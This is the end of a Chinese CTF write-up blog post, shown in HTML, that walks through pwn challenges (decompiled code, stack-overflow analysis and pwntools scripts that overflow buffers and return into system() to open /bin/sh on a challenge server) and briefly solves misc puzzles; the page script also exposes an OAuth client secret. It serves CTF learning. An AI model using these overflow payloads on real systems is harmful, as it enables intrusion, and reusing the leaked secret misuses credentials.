+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">int sub_804880D()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax@2</span><br><span class="line"></span><br><span class="line">  system(&quot;clear&quot;);</span><br><span class="line">  sub_804877A(&quot;banner.txt&quot;, &quot;Welcome to warhamer&quot;);</span><br><span class="line">  if ( sub_80486A2() )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Hello &apos;%s&apos;, what would you like to do ?\n&quot;, byte_8049DC8);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    printf(&quot; %u. Process authentification\n&quot;, 1);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    printf(&quot; %u. Exit this cool program\n&quot;, 2);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    result = sub_8048719();</span><br><span class="line">    if ( result == 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      result = sub_80486B7();</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( result == 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;\n\nUser name : &quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    fgets(byte_8049DC8, 20, stdin);</span><br><span class="line">    sub_804866C(byte_8049DC8);</span><br><span class="line">    result = sub_804880D();</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到进入程序时需要输入的byte_804880D是在bss段上的，这意味着我们可以直接调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:08049DC8 ; char byte_8049DC8[20]</span><br><span class="line">.bss:08049DC8 byte_8049DC8    db 14h dup(?)           ; DATA XREF: sub_80486A2+3o</span><br><span class="line">.bss:08049DC8                                         ; sub_804880D+59o ...</span><br></pre></td></tr></table></figure>
+<p>当我们选择1的时候调用的函数中出现了栈溢出的漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">unsigned int sub_80486B7()</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [sp+11h] [bp-17h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;Enter password: &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  fgets(&amp;s, 100, stdin);</span><br><span class="line">  puts(&quot;Authentification failed&quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  return sleep(1u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>fgets()可输入的字符长度过长了。<br>exp如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io=remote(&quot;47.100.40.190&quot;,10011)</span><br><span class="line">sys_plt=0x8048500</span><br><span class="line">binsh=&quot;/bin/sh\x00&quot;</span><br><span class="line">payload=&apos;a&apos;*(0x17+4)+p32(sys_plt)+p32(0xdeadbeef)+p32(0x8049DC8)</span><br><span class="line">io.sendlineafter(&quot;User name : &quot;,binsh)</span><br><span class="line">io.sendlineafter(&quot;Action: &quot;,&apos;1&apos;)</span><br><span class="line">io.sendlineafter(&quot;Enter password: &quot;,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>sys_plt即system()的plt地址，它指向了system()的got地址，因为程序最开始调用了system()来清空屏幕，所以可以通过plt地址来调用函数。<br>别忘了/bin/sh后要加上\x00，最好要有这个习惯。</p>
+<h3 id="5-pwn4"><a href="#5-pwn4" class="headerlink" title="5. pwn4"></a>5. pwn4</h3><p>和上题一样走下程序。我这里就不写了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">int Login()</span><br><span class="line">&#123;</span><br><span class="line">  char *v0; // rax@3</span><br><span class="line">  char *v2; // [sp+0h] [bp-10h]@1</span><br><span class="line">  unsigned __int64 i; // [sp+8h] [bp-8h]@5</span><br><span class="line"></span><br><span class="line">  printf(&quot;username: &quot;, 0LL);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  fgets(strUsername, 15, stdin);</span><br><span class="line">  v2 = strchr(strUsername, 10);</span><br><span class="line">  if ( v2 )</span><br><span class="line">    *v2 = 0;</span><br><span class="line">  printf(&quot;password: &quot;, 10LL, v2);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  fgets(strPassword, 15, stdin);</span><br><span class="line">  v0 = strchr(strPassword, 10);</span><br><span class="line">  if ( v0 )</span><br><span class="line">    *v0 = 0;</span><br><span class="line">  for ( i = 0LL; i &lt;= 1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = strcmp(strUsername, (&amp;userlist)[16 * i]);</span><br><span class="line">    if ( !(_DWORD)v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = strcmp(strPassword, (&amp;off_6010A8)[16 * i]);</span><br><span class="line">      if ( !(_DWORD)v0 )</span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(v0) = Menu(strPassword);</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>程序最开始要求输入账号和密码，我们可以看到反编译后的的比较代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LODWORD(v0) = strcmp(strUsername, (&amp;userlist)[16 * i]);</span><br><span class="line">   if ( !(_DWORD)v0 )</span><br><span class="line">   &#123;</span><br><span class="line">     LODWORD(v0) = strcmp(strPassword, (&amp;off_6010A8)[16 * i]);</span><br><span class="line">     if ( !(_DWORD)v0 )</span><br><span class="line">     &#123;</span><br></pre></td></tr></table></figure>
+<p>shift+f12 搜索字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000400B28   00000006 C admin                                                   </span><br><span class="line">.rodata:0000000000400B2E   00000009 C T6OBSh2i                                                </span><br><span class="line">.rodata:0000000000400B37   00000006 C guest                                                   </span><br><span class="line">.rodata:0000000000400B40   00000030 C Sorry, this feature is only available for admin         </span><br><span class="line">.rodata:0000000000400B70   0000000A C Command:                                                </span><br><span class="line">.rodata:0000000000400B80   00000027 C Sorry, this feature has been disabled.                  </span><br><span class="line">.rodata:0000000000400BA7   00000007 C Users:                                                  </span><br><span class="line">.rodata:0000000000400BAE   00000007 C  * %s\n                                                 </span><br><span class="line">.rodata:0000000000400BB8   00000033 C \nPanel\n\n1. exec command\n2. show user list\n3. exit\n</span><br><span class="line">.rodata:0000000000400BEB   0000000E C Your choice:                                            </span><br><span class="line">.rodata:0000000000400BF9   0000000B C username:                                               </span><br><span class="line">.rodata:0000000000400C04   0000000B C password:                                               </span><br><span class="line">.rodata:0000000000400C10   00000031 C Bad credentials. This incident will be reported.        </span><br><span class="line">.eh_frame:0000000000400CFF 00000006 C ;*3$\&quot;</span><br></pre></td></tr></table></figure>
+<p>可以看到最上面的两条即我们的账号和密码。<br>登陆后是一个菜单。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">while ( 1 )</span><br><span class="line">&#123;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;\nPanel\n\n1. exec command\n2. show user list\n3. exit\n&quot;);</span><br><span class="line">    printf(&quot;Your choice: &quot;);</span><br><span class="line">    fflush(_bss_start);</span><br><span class="line">    v2 = read(0, buf, 0x280uLL);</span><br><span class="line">    buf[v2] = 0;</span><br><span class="line">    if ( buf[0] != 49 )</span><br><span class="line">      break;</span><br><span class="line">    ExecCmd(0LL, buf);</span><br></pre></td></tr></table></figure>
+<p>一眼就看到了read()存在栈溢出。那么这次要怎么getshell呢？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040084A                 mov     edi, offset cmd ; command</span><br><span class="line">.text:000000000040084F                 call    _system</span><br></pre></td></tr></table></figure>
+<p>看到这段汇编，将输入的cmd传入edi再调用_system()，简直完美，我们只需要在cmd中输入/bin/sh，再调用这段汇编就行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io=remote(&quot;47.100.40.190&quot;,10009)</span><br><span class="line">urn=&quot;admin&quot;</span><br><span class="line">pwd=&quot;T6OBSh2i&quot;</span><br><span class="line"></span><br><span class="line">payload=&apos;a&apos;*0x58+p64(0x40084A)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;: &quot;)</span><br><span class="line">io.sendline(urn)</span><br><span class="line">io.recvuntil(&quot;: &quot;)</span><br><span class="line">io.sendline(pwd)</span><br><span class="line">io.recvuntil(&quot;: &quot;)</span><br><span class="line">io.sendline(&quot;1&quot;)</span><br><span class="line">io.recvuntil(&quot;: &quot;)</span><br><span class="line">io.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">io.recvuntil(&quot;: &quot;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(&quot;: &quot;)</span><br><span class="line">io.sendline(&quot;3&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="1-Crack-Zip"><a href="#1-Crack-Zip" class="headerlink" title="1. Crack Zip"></a>1. Crack Zip</h3><p>用群里的zip爆破软件爆破一下8位数字即可</p>
+<h3 id="2-今天去了四牌楼"><a href="#2-今天去了四牌楼" class="headerlink" title="2. 今天去了四牌楼"></a>2. 今天去了四牌楼</h3><p>看到了题目中的提示，一般用相机拍出来的照片都会带有很多信息，光圈大小，快门速度，ISO，焦距，相机型号，甚至还会带有坐标（我说的就是ios的相机）。那么这次我们直接看这张图片的属性。ok find the flag</p>
+<h3 id="3-二维码"><a href="#3-二维码" class="headerlink" title="3. 二维码"></a>3. 二维码</h3><p>直接取个xor，再扫描即可。 似乎一些容错比较强的扫描器也能直接扫出来。</p>
+<h3 id="4-zip"><a href="#4-zip" class="headerlink" title="4. zip"></a>4. zip</h3><p>zip文件头修复，将AABB改成0304，保存即可</p>
+<h3 id="5-问卷"><a href="#5-问卷" class="headerlink" title="5. 问卷"></a>5. 问卷</h3><p>将文件改成zip格式，解压，看到flag的文件夹，完事。</p>
+
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Writeup/" <i class="fa fa-tag">Writeup</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/Notice/2018秋季招新/" rel="next" title="2018秋季招新">
+                <i class="fa fa-chevron-left"></i> 2018秋季招新
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/uncategorized/flask-session/" rel="prev" title="从hctf的两道web题谈flask客户端session机制">
+                从hctf的两道web题谈flask客户端session机制 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+          
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/logo.jpg" alt="Susers">
+          <p class="site-author-name" itemprop="name">Susers</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">19</span>
+              <span class="site-state-item-name">Posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">Categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">Tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/susers" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.bxsteam.xyz/" title="BXS Team" target="_blank">BXS Team</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://asuri.org/" title="Asuri Team" target="_blank">Asuri Team</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://github.com/SEU-ITE/" title="SEU-ITE" target="_blank">SEU-ITE</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#seu-wlan-level-1"><span class="nav-number">1.1.</span> <span class="nav-text">seu_wlan level_1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#huaji"><span class="nav-number">1.2.</span> <span class="nav-text">huaji</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#seu-wlan-level-2"><span class="nav-number">1.3.</span> <span class="nav-text">seu_wlan level_2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#seu-wlan-crack"><span class="nav-number">1.4.</span> <span class="nav-text">seu_wlan crack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exec"><span class="nav-number">1.5.</span> <span class="nav-text">exec</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">2.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-HelloReverse"><span class="nav-number">2.1.</span> <span class="nav-text">0x00 HelloReverse</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-HelloPython"><span class="nav-number">2.2.</span> <span class="nav-text">0x01 HelloPython</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-XOR1"><span class="nav-number">2.3.</span> <span class="nav-text">0x02 XOR1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-XOR2"><span class="nav-number">2.4.</span> <span class="nav-text">0x03 XOR2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-Maze"><span class="nav-number">2.5.</span> <span class="nav-text">0x04 Maze</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-BabyAndroid"><span class="nav-number">2.6.</span> <span class="nav-text">0x05 BabyAndroid</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#End"><span class="nav-number">2.7.</span> <span class="nav-text">End</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto"><span class="nav-number">3.</span> <span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-base1"><span class="nav-number">3.1.</span> <span class="nav-text">1.  base1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-base2"><span class="nav-number">3.2.</span> <span class="nav-text">2.  base2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-中国人的价值观"><span class="nav-number">3.3.</span> <span class="nav-text">3.  中国人的价值观</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-这不是凯撒"><span class="nav-number">3.4.</span> <span class="nav-text">4.  这不是凯撒</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-are-you-ok"><span class="nav-number">3.5.</span> <span class="nav-text">5.  are you ok</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn"><span class="nav-number">4.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-helloworld"><span class="nav-number">4.1.</span> <span class="nav-text">1.helloworld</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-年轻人的第二道pwn"><span class="nav-number">4.2.</span> <span class="nav-text">2. 年轻人的第二道pwn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-pwn2plus"><span class="nav-number">4.3.</span> <span class="nav-text">3. pwn2plus</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-bss-stack"><span class="nav-number">4.4.</span> <span class="nav-text">4. bss_stack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-pwn4"><span class="nav-number">4.5.</span> <span class="nav-text">5. pwn4</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-number">5.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Crack-Zip"><span class="nav-number">5.1.</span> <span class="nav-text">1. Crack Zip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-今天去了四牌楼"><span class="nav-number">5.2.</span> <span class="nav-text">2. 今天去了四牌楼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-二维码"><span class="nav-number">5.3.</span> <span class="nav-text">3. 二维码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-zip"><span class="nav-number">5.4.</span> <span class="nav-text">4. zip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-问卷"><span class="nav-number">5.5.</span> <span class="nav-text">5. 问卷</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Susers</span>
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</span></div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">全站共31.0k字</span>
+</div>
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+    <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+    <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+    <script type="text/javascript">
+        (function() {
+            var id = '';
+            var owner = 'XuCcc';
+            var repo = 'XuCcc.github.io';
+            var clientId = 'f03b9d3d14222e890fdc';
+            var clientSecret = '676341561e48fad43015c644798175b16ee69fe0';
+
+            var gitment = new Gitment({
+                owner: owner,
+                repo: repo,
+                oauth: {
+                    client_id: clientId,
+                    client_secret: clientSecret,
+                },
+            });
+            gitment.render('comments');
+        })();
+    </script>
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+      <!-- UY BEGIN -->
+      <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid="></script>
+      <!-- UY END -->
+  
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" async src="//push.zhanzhang.baidu.com/push.js">
+</script>
+
+
+</body>
+</html>
